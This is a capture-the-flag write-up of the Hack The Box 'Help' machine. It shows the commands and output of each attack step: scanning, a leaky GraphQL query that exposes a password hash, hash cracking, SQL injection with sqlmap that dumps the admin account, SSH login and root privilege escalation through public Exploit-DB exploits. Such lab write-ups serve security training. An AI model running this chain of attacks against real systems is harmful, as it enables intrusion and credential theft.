
### Initial access
Nmap
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Dir scan
```
┌──(kali㉿kali)-[~/HTB/Help]
└─$ cat dirs | jq -r '.results[] | [.status, .url] | @tsv' | sort
cat files | jq -r '.results[] | [.status, .url] | @tsv' | sort
301     http://help.htb/javascript
301     http://help.htb/javascript/jquery
301     http://help.htb/support
301     http://help.htb/support/controllers
301     http://help.htb/support/css
301     http://help.htb/support/images
301     http://help.htb/support/includes
301     http://help.htb/support/js
301     http://help.htb/support/uploads
301     http://help.htb/support/views
403     http://help.htb/server-status

```
``

Recon graphSQL endpoint
```
┌──(kali㉿kali)-[~/HTB/Help]
└─$ curl -G 'http://help.htb:3000/graphql' \
  --data-urlencode 'query={user{username}}'
{"data":{"user":{"username":"helpme@helpme.com"}}}  


```
We actualy return user name so add password to query
```bash
echo '5d3c93182bb20f07b994a7f617e99cff' > hash


┌──(kali㉿kali)-[~/HTB/Help]
└─$ curl -G 'http://help.htb:3000/graphql' \              
  --data-urlencode 'query={user{username password}}' | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     96 100     96   0      0     65      0   00:01   00:01              0
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
         
```
Crack password
```bash
┌──(kali㉿kali)-[~/HTB/Help]
└─$ john --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
godhelpmeplz     (?)     
1g 0:00:00:00 DONE (2026-09-17 03:16) 3.225g/s 25284Kp/s 25284Kc/s 25284KC/s godiamond11213..goddard7
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
                       
```

Cred 
`helpme@helpme.com:godhelpmeplz`
Acces web base in port 80 in dirscan
We using  https://www.exploit-db.com/exploits/41200
Fix payload 
```
┌──(kali㉿kali)-[~/HTB/Help]
└─$ sed -i "s/requests.session(config={'verbose': sys.stderr})/requests.Session()/g" 41200.py

```

Some how it not return what i need so sqlmap is the guy
```bash
┌──(kali㉿kali)-[~/HTB/Help]
└─$ sqlmap -u 'http://help.htb/support/?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=1&param[]=8 ' \
  --cookie='PHPSESSID=8iki77mqhe7tfon056g9h4v7l7' \
  --batch --dump
        ___

```

```
[04:29:35] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[04:29:35] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[04:29:35] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[04:29:35] [INFO] starting 8 processes 
[04:29:36] [INFO] cracked password 'Welcome1' for user 'admin'                                                                                                                                                                             
Database: support                                                                                                                                                                                                                          
Table: staff
[1 entry]
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
| id | email              | login      | avatar | admin   | status   | fullname      | password                                            | timezone | username | signature                      | department         | last_login | newticket_notification |
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
| 1  | support@mysite.com | 1547216217 | NULL   | 1       | Enable   | Administrator | d318f44739dced66793b1a603028133a76ae680e (Welcome1) | <blank>  | admin    | Best regards,\r\nAdministrator | a:1:{i:0;s:1:"1";} | 1543429746 | 0                      |
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+

```
We have cred `help:Welcome1`

```bash
┌──(kali㉿kali)-[~/HTB/Help]
└─$ ssh help@10.129.230.159                                                              
help@10.129.230.159's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jan 11 06:18:50 2019
help@help:~$ 

```

### Priv escalation
Run linpeas
```bash {11}
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                  
-rwsr-xr-x 1 root root 1015K Feb 10  2018 /usr/sbin/exim4                                                                                        
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                            
-rwsr-xr-x 1 root root 9.9K Jan  1  2016 /usr/lib/s-nail/s-nail-privsep (Unknown SUID binary!)
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 419K Nov  5  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping



```

We have exploit https://www.exploit-db.com/exploits/47172
```
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
# 
```